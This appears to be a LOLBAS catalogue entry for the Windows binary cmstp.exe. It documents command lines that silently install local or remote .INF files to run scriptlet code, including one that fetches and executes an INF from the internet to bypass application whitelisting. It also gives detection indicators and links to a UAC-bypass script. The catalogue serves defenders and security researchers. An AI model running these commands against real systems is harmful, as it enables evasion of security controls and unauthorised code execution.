---
Name: Cmstp.exe
Description: Installs or removes a Connection Manager service profile.
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: cmstp.exe /ni /s c:\cmstp\CorpVPN.inf
    Description: Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.
    Usecase: Execute code hidden within an inf file. Download and run scriptlets from internet.
    Category: Execute
    Privileges: User
    MitreID: T1218.003
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf
    Description: Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.
    Usecase: Execute code hidden within an inf file. Execute code directly from Internet.
    Category: AwL bypass
    Privileges: User
    MitreID: T1218.003
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
Full_Path:
  - Path: C:\Windows\System32\cmstp.exe
  - Path: C:\Windows\SysWOW64\cmstp.exe
Code_Sample:
- Code:
Detection:
 - IOC: Execution of cmstp.exe should not be normal unless VPN is in use
 - IOC: Cmstp.exe communication towards internet and getting files
Resources:
  - Link: https://twitter.com/NickTyrer/status/958450014111633408
  - Link: https://gist.github.com/NickTyrer/bbd10d20a5bb78f64a9d13f399ea0f80
  - Link: https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e
  - Link: https://oddvar.moe/2017/08/15/research-on-cmstp-exe/
  - Link: https://gist.githubusercontent.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1/raw/3127ba7453a6f6d294cd422386cae1a5a2791d71/UACBypassCMSTP.ps1
  - Link: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmstp
Acknowledgement:
  - Person: Oddvar Moe
    Handle: '@oddvarmoe'
  - Person: Nick Tyrer
    Handle: '@NickTyrer'
---
